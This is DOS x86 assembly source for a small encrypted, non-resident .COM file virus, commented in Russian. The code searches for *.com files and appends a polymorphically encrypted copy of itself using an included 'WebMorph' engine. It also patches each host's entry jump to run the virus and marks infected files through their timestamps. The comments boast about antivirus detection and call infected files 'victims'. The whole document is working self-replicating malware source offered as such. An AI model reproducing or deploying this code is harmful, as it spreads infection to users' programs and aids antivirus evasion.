; Простейший шифрованный .com нерезидент...Но вот проверьте его жертв DrWeb'ом..
; AVP ругается как type_com.

; Так по размеру скоро и SSR догоню :)

.model tiny
.386
.code
	org 0h
Main:	Call	GOfs
GOfs:	pop	si
	sub	si,offset GOfs-Main
	mov	cx,Vlen
	mov	ax,es
	add	ax,1000h
	mov	es,ax
	xor	di,di
rep	movsb
	push	es
	push	offset HE
	retf
Fmask	db	'*.com',0
Old	db	0CDh,020h,0,0
	db	0E9h
JJump	dw	?
;---
HE:	push	ds ds
	push	es ds
	pop	es ds
	mov	si,offset Old
	mov	di,100h
	movsw				; Восстановим носитель
	movsw
	push	cs cs
	pop	ds es

	mov	ah,1Ah
	mov	dx,offset Dta
	int	21h
	mov	ah,4Eh
	mov	dx,offset Fmask
NFIle:	int	21h
	jb	JQuit
	mov	ax,3D02h
	mov	dx,offset Fname
	int	21h
	xchg	ax,bx
	mov	ax,5700h
	int	21h
	or	cx,cx
	jz	Close
	mov	ah,3Fh
	mov	dx,offset Old
	mov	cx,4
	int	21h
	mov	ax,4202h
	xor	cx,cx
	cwd
	int	21h
	push	ax
	xor	si,si
	mov	di,offset Free
	mov	cx,vlen
	Call	WebMorph
	mov	ah,40h
	mov	dx,di
	int	21h
	mov	ax,4200h
	xor	cx,cx
	cwd
	int	21h
	pop	ax
	sub	ax,3
	mov	[JJump],ax
	mov	ah,40h
	mov	dx,offset JJump-1
	mov	cx,3
	int	21h
	mov	ax,5700h
	int	21h
	xor	cx,cx
	mov	ax,5701h
	int	21h
Close:	mov	ah,3eh
	int	21h
	mov	ah,4Fh
	jmp	NFile
JQuit:	pop	es ds
	push	es
	push	100h
	retf

include	webmorph.inc
Vlen	equ	$ - main

Dta	db	21 dup (?)
	db	?
	dw	?
	dw	?
	dd	?
Fname	db	13 dup (?)
Free:
End	main